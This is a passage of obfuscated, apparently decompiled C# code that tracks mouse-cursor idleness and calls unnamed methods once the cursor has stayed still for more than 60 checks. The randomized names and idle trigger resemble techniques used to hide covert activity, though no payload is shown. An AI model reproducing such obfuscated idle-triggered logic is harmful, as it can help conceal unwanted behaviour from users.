        Program.AiuzGaMsufJpCQPOyeLC(Program.maNDIKmyVgEMYyXmKkLq);
        Program.ScWFlCrgXMZPjpRcgGId = false;
      }
      if (Program.QOLZSmaPeCjBVBRvgWcO() != 1)
        return;
      Program.KhJZHDIBNWBiAVLTFyBC();
    }

    private static void qIWRIHBtUIRrrtOGyrJt()
    {
      if (Program.IzUnJsGMZRcKUXzXjCUb == Cursor.Position.X && Program.EdLhSMANUPLRlgwXCQMS == Cursor.Position.Y)
      {
        ++Program.GdPGmbykHJbgKtMViEZU;
        if (Program.GdPGmbykHJbgKtMViEZU <= 60)
          return;
        Program.QjZJxdNPgoAtFzuxipFV();
      }
      else
      {
        Program.VttUYrBVGGVnrGGaoUBX();
        Program.GdPGmbykHJbgKtMViEZU = 1;
        Program.IzUnJsGMZRcKUXzXjCUb = Cursor.Position.X;
        Program.EdLhSMANUPLRlgwXCQMS = Cursor.Position.Y;
      }
    }
  }
}
